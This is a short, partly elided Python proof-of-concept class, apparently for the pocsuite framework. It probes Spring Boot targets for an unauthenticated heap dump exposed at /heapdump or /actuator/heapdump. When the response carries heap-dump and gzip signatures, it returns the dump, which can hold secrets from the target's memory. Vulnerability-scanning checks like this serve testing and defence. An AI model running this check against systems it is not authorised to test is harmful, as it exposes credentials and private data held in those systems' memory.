...
class DemoPOC(POCBase):
    ...
    references = []
    name = 'springboot springboot Pre-Auth heapdump Information Disclosure'
    appPowerLink = ''
    appName = 'springboot'
    appVersion = ''
    ...
    def _exploit(self):
        result = {}
        paths=["/heapdump","/actuator/heapdump"]
        for  path in paths:
            res = requests.get(urljoin(self.url,path), headers=self.headers)
            logger.debug(res.text)
            if "4a4156412050524f46494c45" in res.text and "4850524f46" in res.text and "1f8b080000000000" in res.text:
                return res.text
